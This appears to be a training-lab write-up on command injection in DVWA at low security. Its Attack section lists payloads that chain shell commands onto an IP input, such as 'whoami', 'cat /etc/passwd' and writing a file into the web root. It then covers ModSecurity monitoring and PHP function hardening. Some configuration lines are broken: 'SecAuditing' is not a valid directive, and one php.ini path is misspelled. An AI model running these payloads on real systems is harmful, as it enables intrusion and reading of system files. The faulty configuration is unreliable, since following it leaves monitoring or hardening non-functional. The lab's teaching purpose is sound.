# Command Injection - Low
## Attack
### Objective
Exploit command injection in DVWA at low security level to execute system commands on the server.

### Steps
1. Log into DVWA at `http://ip-address/dvwa/`
2. Set security level to **low**
3. Navigate to **Command Injection**
4. Test the following payloads:
    - 127.0.0.1; whoami
    - 127.0.0.1; id
    - 127.0.0.1; ls -la
    - 127.0.0.1; pwd
    - 127.0.0.1; cat /etc/passwd
    - 127.0.0.1; echo "wazuh test" > /var/www/html/dvwa/wazuh_attacker_test.txt

### Notes
- The semicolon (`;`) is used to chain commands in bash.
- At low difficulty, there is no input sanitation.
- Commands are executed with the privileges of the `www-data` user.
------------------------------------------------------------

## Monitor
### Tools Used
- Apache Access Logs: Best for detecting command injection attempts.
- ModSecurity (Web Application Firewall): Can detect and block suspicious requests in real-time.

### Install ModSecurity:
```bash
sudo apt update
sudo apt install -y libapache2-mod-security2
sudo a2enmod security2 # enable modsecurity
sudo systemctl restart apache2
```

### Enable Audit Logging:
#### Edit /etc/modsecurity/modsecurity.conf
```bash
SecAuditEngine On
SecAuditing /var/log/apache2/modsec_audit.log
```

### Commands to detect attacks
**Monitor logs in real time:**
```bash
sudo tail -f /var/log/apache2/modsec_audit.log
```
-----------------------------------------------------------

## Mitigate
At low difficulty, DVWA applies no input sanitation or filtering.

How DVWA "Mitigates" at low":
- It does not sanitize or escape user input.
- It directly passes the input into a system command.

How to bypass:
- Use the semicolon (;) to chain commands
- Example 127.0.0.1; whoami

### PHP Hardening
Disable dangerous functions:
```bash
sudo nano /etc/php/*/apachje2/php.ini
```
Add:
```ini
disable_functions = system,exec,shell_exec,passthru,proc_open, popen
```
Restart Apache
```bash
sudo systemctl restart apache2
```

# Summary
At low difficulty, command injection is trivial to exploit. ModSecurity combined with PHP hardening provides strong protection in real environments.